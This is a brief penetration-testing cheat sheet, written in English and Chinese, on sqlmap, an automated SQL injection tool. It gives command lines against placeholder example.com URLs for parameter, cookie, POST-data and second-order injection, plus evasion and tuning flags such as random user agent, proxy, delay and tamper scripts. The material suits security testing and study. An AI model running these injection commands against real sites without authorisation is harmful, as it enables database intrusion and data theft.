Automatic SQL injection tool.

## 1. Usage

经典注入

```
┌──(root@kali)-[~]
└─$ sqlmap -u "http://example.com/search.php?id=1" --batch
```

指定测试参数

```
┌──(root@kali)-[~]
└─$ sqlmap -u "http://example.com/search.php?id=1" -p "id" --batch
```

测试 Cookie

```
┌──(root@kali)-[~]
└─$ sqlmap -u "http://example.com/search.php?id=1" --cookie="PHPSESSID=a8d127e.." --level=2 --batch
```

添加表单数据

```
┌──(root@kali)-[~]
└─$ sqlmap -u "http://example.com/login.php" --data="username=test&password=test" --batch
```

从文件中载入 HTTP 请求

```
┌──(root@kali)-[~]
└─$ sqlmap -r "req.txt"
```

二次响应

> `Response` 与 `Request` 不在同一个页面

```
┌──(root㉿kali)-[~]
└─# sqlmap -r "req.txt" --second-url "http://example.com/response"
```

进阶用法

```
--threads=1 # 线程
--retries=3 # 重试
--timeout=10 # 超时
--level=5 # 检测范围
--risk=3 # 测试强度
--random-agent # 随机 HTTP User-Agent
--proxy "127.0.0.1:10808" # 配置代理
--delay 3 # 延迟 3 秒注入
--tamper=sqli.py # 调用脚本
```

---

**References**

- [sqlmap](https://www.kali.org/tools/sqlmap/)
